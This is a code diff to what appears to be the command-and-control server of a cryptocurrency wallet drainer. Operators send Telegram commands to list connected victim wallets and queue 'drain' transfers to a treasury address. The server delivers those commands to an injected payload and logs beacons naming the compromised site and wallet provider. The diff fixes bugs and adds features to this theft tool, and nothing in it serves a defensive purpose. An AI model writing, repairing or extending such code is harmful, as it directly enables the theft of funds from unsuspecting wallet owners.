@@ -37,8 +37,7 @@ function listTargets() {
 }
 
 function queueDrain(pk, to) {
-  cmds[pk] = { to, n: Date.now() + Math.random().toString(36).slice(2, 6) };
-  return cmds[pk].n;
+  cmds[pk] = { to, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now() };
 }
 
 async function pollTg() {
@@ -48,53 +47,52 @@ async function pollTg() {
       if (u.update_id <= tgOffset) continue;
       tgOffset = u.update_id;
       fs.writeFileSync(__dirname + "/.offset", String(tgOffset));
-      const [cmd, ...rest] = (u.message?.text || "").trim().split(/\s+/);
-      const c = (cmd || "").toLowerCase();
-      if (c === "/help") {
+      const parts = (u.message?.text || "").trim().split(/\s+/);
+      const cmd = (parts[0] || "").toLowerCase();          // command lowercased, args preserved (base58 is case-sensitive!)
+      const rest = parts.slice(1);
+      if (cmd === "/help") {
         tg("Patroller commands\n/targets \u2014 list detected wallets\n/drains \u2014 drain ALL targets \u2192 treasury\n/drains <addr|#> [addr] \u2014 drain one target \u2192 addr or treasury\n/stop \u2014 cancel queued drain (last or <#>)\n/clear \u2014 forget all targets\n/clear <addr|#> \u2014 forget one target");
-      } else if (c === "/drains") {
+      } else if (cmd === "/drains") {
         const list = Object.keys(targets);
         if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
         let picked, to;
-        const arg = (rest[0] || "").toLowerCase();
-        if (arg === "all" || arg === "") { picked = list; to = rest[1] || TREASURY; }
+        const arg = rest[0] || "";
+        if (arg === "" || arg.toLowerCase() === "all") { picked = list; to = rest[1] || TREASURY; }
         else if (/^\d{1,3}$/.test(arg)) { const i = (parseInt(arg) - 1) % list.length; picked = [list[i]]; to = rest[1] || TREASURY; }
         else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
-        else { picked = [list[list.length - 1]]; to = rest[0] || TREASURY; }
+        else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
         if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + to.slice(0, 20));
         const lines = [];
         for (const pk of picked) {
-          const n = queueDrain(pk, to);
-          cmds[pk].n = n;
+          queueDrain(pk, to);
           lines.push("\u2022 " + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
         }
         tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
-      } else if (c === "/stop") {
+      } else if (cmd === "/stop") {
         const list = Object.keys(targets);
         const key = (/^\d{1,3}$/.test(rest[0] || "") && list.length) ? list[(parseInt(rest[0]) - 1) % list.length]
           : (B58RE.test(rest[0] || "") ? rest[0] : (list.length ? list[list.length - 1] : null));
         if (!key || !cmds[key]) return tg("no queued drain for that target");
         delete cmds[key];
         tg("cancelled queued drain for " + key.slice(0, 4) + "\u2026" + key.slice(-4));
-      } else if (c === "/clear") {
+      } else if (cmd === "/clear") {
         const list = Object.keys(targets);
-        const key = (rest[0] || "").toLowerCase();
+        const key = rest[0] || "";
         if (B58RE.test(key) && targets[key]) { delete targets[key]; delete cmds[key]; return tg("forgot " + key.slice(0, 4) + "\u2026" + key.slice(-4)); }
         if (/^\d{1,3}$/.test(key) && list.length) { const k2 = list[(parseInt(key) - 1) % list.length]; delete targets[k2]; delete cmds[k2]; return tg("forgot " + k2.slice(0, 4) + "\u2026" + k2.slice(-4)); }
-        if (key === "all" || key === "") { const n = Object.keys(targets).length; targets = {}; return; }
-        const n = Object.keys(targets).length;
-        for (const k of Object.keys(targets)) delete targets[k];
+        const n = list.length;
+        for (const k of Object.keys(targets)) delete targets[k];   // FIXED: was `targets = {}` on a const — threw, silently
         for (const k of Object.keys(cmds)) delete cmds[k];
         tg(n ? "cleared " + n + " targets" : "nothing to clear");
-      } else if (c === "/targets") {
+      } else if (cmd === "/targets") {
         tg(listTargets() || "none \u2014 waiting for a wallet", "targets:");
       }
     }
-  } catch {}
+  } catch (e) { console.error("pollTg:", e && e.message); }
 }
 setInterval(pollTg, 3000);
 
-// expire stale queued commands after 30 min (victim never came back)
+// expire queued drains after 30 min
 setInterval(() => {
   const now = Date.now();
   for (const k of Object.keys(cmds)) {
@@ -117,8 +115,7 @@ http.createServer((req, res) => {
     const c = cmds[pk];
     res.setHeader("content-type", "application/json");
     if (!c) return res.end(JSON.stringify({ cmd: "none" }));
-    delete cmds[pk];                                     // deliver once
-    c.ts = c.ts || Date.now();
+    delete cmds[pk];                                     // deliver once — no popup spam
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
@@ -146,7 +143,13 @@ http.createServer((req, res) => {
         if (j.m === "err") {
           tg("<code>" + (j.pk || "?") + "</code>\n" + (j.msg || "?") + "\norigin: " + (j.origin || "?"), "\u26a0\ufe0f patroller error \u2014 ");
         }
-      } catch {}
+        if (j.m === "dust") {
+          tg("<code>" + (j.pk || "?") + "</code>\n" + (j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + (j.origin || "?"), "\u00b7 \u2014 ");
+        }
+        if (j.m === "loaded") {
+          tg("payload loaded on <code>" + (j.origin || "?") + "</code>\nprovider seen: <b>" + (j.provider || "?") + "</b>", "\ud83d\udcf2 bookmark \u2014 ");
+        }
+      } catch (e) { console.error("beacon parse:", e && e.message); }
       res.setHeader("content-type", "application/json");
       res.end("{}");
     });
